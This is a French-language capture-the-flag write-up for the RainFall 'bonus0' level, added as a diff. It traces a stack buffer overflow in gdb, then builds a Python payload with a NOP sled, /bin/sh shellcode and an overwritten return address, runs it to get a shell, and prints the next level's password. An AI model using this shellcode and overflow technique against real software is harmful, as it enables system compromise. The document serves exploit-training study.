@@ -1,0 +1,72 @@
+gdb disass main
+
+On voit un call a la fonction pp
+
+disass pp
+
+Deux call a la fonction p
+
+disass p
+
+
+la fonction p utilise read qui est suivie d'un strncpy
+
+run
+
+	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+
+puis encore
+
+	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+
+
+Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa�� Aa0Aa1Aa2Aa3Aa4Aa5Aa��
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41336141 in ?? ()
+
+L'offset est donc de 9, mais on ne sait pas si c'est dans la premiere ou la deuxieme string
+
+run
+
+	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+puis
+	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+
+
+AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa�� Aa0Aa1Aa2Aa3Aa4Aa5Aa��
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41336141 in ?? ()
+
+L'offset est donc de la seconde string
+
+
+READ ne lis que 4096 caracteres et utilise \n comme delimiteur
+
+On remplis le premier buffer en incluant un shellcode et sur le second on overflow sur le pointeur de retour de main
+
+python -c '
+	print "\x90" * 2072 +\
+	"\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80" +\
+	"\x90" * 2000 +\
+	"\x0a"+\
+	"AAAAAAAAAAAAAA"+\
+	"\x38\xe8\xff\xbf\xff"+\
+	"\x0a"
+' > /tmp/a
+
+
+cat /tmp/a - | ./bonus0
+
+
+
+
+bonus0@RainFall:~$ cat /tmp/a - | ./bonus0
+ -
+ -
+��������������������AAAAAAAAAAAAAA8���� AAAAAAAAAAAAAA8����
+cd ../bonus1 && cat .pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
